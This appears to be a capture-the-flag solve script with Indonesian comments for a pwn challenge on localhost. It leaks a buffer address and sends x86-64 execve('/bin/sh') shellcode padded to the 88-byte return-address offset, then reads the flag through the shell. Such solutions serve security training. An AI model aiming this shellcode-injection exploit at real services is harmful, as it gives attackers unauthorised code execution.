#!/bin/bash
# Oneliner solve untuk pwn_sandrone (localhost:40401).
# Vuln: read(0, buf, 0x100) ke buffer 80 byte, offset ke return address = 88 byte.
# Return address ditimpa alamat buf itu sendiri (dibocorkan server lewat "debug: buf @ %p"),
# dan di awal buf ditaruh shellcode execve("/bin/sh") -> ret2shellcode (stack NX off).
#
# CATATAN: tidak bisa pakai pola `python3 -c "..." | nc host port` yang statis
# (seperti contoh buffer overflow biasa), karena alamat buffer di-leak BERBEDA
# setiap koneksi (ASLR stack tetap aktif walau binary No-PIE). Jadi payload
# wajib disusun SETELAH baca leak dulu -> butuh socket dua arah di python,
# bukan pipe satu arah ke nc.
#
# shellcode di bawah = execve("/bin/sh") x86-64, 48 byte (hasil pwntools shellcraft.sh()).

python3 -c "
import socket,struct,re,time
s=socket.create_connection(('localhost',40401),timeout=5)
d=s.recv(4096)
a=int(re.search(rb'buf @ (0x[0-9a-f]+)',d).group(1),16)
s.sendall(b'x\n');time.sleep(0.2);s.recv(4096)
sc=b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814\x24\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
s.sendall(sc.ljust(88,b'A')+struct.pack('<Q',a));time.sleep(0.3)
s.sendall(b'cat flag.txt\n');time.sleep(0.3)
print(s.recv(4096).decode())
"
